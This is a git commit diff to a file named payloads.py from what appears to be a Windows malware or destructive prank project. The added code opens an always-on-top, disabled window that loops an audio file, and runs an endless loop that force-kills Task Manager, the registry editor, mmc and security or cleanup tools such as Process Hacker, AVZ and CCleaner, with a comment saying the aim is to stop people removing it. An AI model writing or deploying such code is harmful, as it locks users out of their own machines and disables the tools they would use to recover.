391ffe162ea8d6bc1f5d7512e2e3601309b82781
dotPast <83116565+dotPast@users.noreply.github.com>
2024-02-29 09:43:40 -0800

    block more apps and finish cherry window

--- payloads.py
+++ payloads.py
@@ -3,7 +3,10 @@ from PIL import Image
 import os
 import threading
 import time
+import pygame
+import cv2
 
+pygame.mixer.init()
 assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")
 
 def cherry_window():
@@ -19,7 +22,9 @@ def cherry_window():
     top.attributes("-topmost", True)
     top.attributes("-disabled", True)
 
-    top.mainloop()
+    pygame.mixer.music.load(os.path.join(assets, 'cherry.mp3'))
+    pygame.mixer.music.play(32767)
+    top.mainloop()    
 
 def blocked_apps():
 	while True:
@@ -27,8 +32,18 @@ def blocked_apps():
 		os.system('tasklist | findstr /i "mmc.exe" && taskkill /f /im mmc.exe')
 		os.system('tasklist | findstr /i "Taskmgr.exe" && taskkill /f /im Taskmgr.exe')
 		os.system('tasklist | findstr /i "regedit.exe" && taskkill /f /im regedit.exe')
+		
+        # Trying to block MHelper (please god just work) and apps like Process Hacker, RegAlyzer, etc. (basically blocking nedohackers' tools)
+		os.system('tasklist | findstr /i "MHelper_full.exe" && taskkill /f /im MHelper_full.exe')
+		os.system('tasklist | findstr /i "ProcessHacker.exe" && taskkill /f /im ProcessHacker.exe')
+		os.system('tasklist | findstr /i "RegAlyzer.exe" && taskkill /f /im RegAlyzer.exe')
+		os.system('tasklist | findstr /i "SU.exe" && taskkill /f /im SU.exe')
+		os.system('tasklist | findstr /i "avz.exe" && taskkill /f /im avz.exe')
+		os.system('tasklist | findstr /i "CCleaner.exe" && taskkill /f /im CCleaner.exe') # idk whats the real name
+		os.system('tasklist | findstr /i "CCleaner64.exe" && taskkill /f /im CCleaner64.exe') # idk whats the real name
 
 block_apps_thread = threading.Thread(target=blocked_apps)
-block_apps_thread.start()
+#block_apps_thread.start()
 
-cherry_window()
+cherry_thread = threading.Thread(target=cherry_window)
+#cherry_thread.start()
